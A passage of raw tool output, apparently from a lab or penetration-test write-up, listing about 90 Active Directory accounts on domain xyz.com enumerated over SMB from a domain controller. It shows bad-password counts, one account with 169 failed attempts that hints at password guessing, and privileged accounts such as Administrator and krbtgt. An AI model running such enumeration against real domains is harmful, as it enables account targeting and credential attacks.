SMB         192.168.225.155 445    DC-1             xyz.com\iturner                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\fslater                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\anorth                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\jgray                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\jsharp                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\jblake                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\rrobertson                     badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\esmith                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\ltaylor                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\lwilkins                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\snewman                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\mjames                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\showard                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\bhardacre                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\amorgan                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\cpeters                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\rhenderson                     badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\marnold                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\munderwood                     badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\lhamilton                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\rdyer                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\kedmunds                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\adavies                        badpwdcount: 0 baddpwdtime: 2022-07-20 12:46:12.859991+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\nmathis                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\lspringer                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\jbower                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\jwalsh                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\bhudson                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\rlyman                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\sknox                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\oallan                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\dbond                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\jclarkson                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\cjackson                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\amcdonald                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\awallace                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\hwalker                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\fwatson                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\bmcgrath                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\pstewart                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\llewis                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\hparsons                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\ncameron                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\dforsyth                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\cfisher                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\palsop                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\jnash                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\pduncan                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\dlawrence                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\nmanning                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\dbutler                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\kpeake                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\isutherland                    badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\dchurchill                     badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\khemmings                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\aterry                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\hmartin                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\thughes                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\areid                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\ppiper                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\ewelch                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\nball                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\ehart                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\troberts                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\rrutherford                    badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\mmorrison                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\fanderson                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\gpullman                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\rbuckland                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\sferguson                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\emitchell                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\amacdonald                     badpwdcount: 169 baddpwdtime: 2022-07-20 12:46:35.305307+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\vcoleman                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\arussell                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\srandall                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\ejones                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\cwilson                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\skelly                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\tmacleod                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\aquinn                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\jbell                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\jparr                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\bthomson                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\kvance                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\wcampbell                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\krbtgt                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\Guest                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         192.168.225.155 445    DC-1             xyz.com\Administrator                  badpwdcount: 0 baddpwdtime: 2022-06-25 21:44:23.931255+00:00
```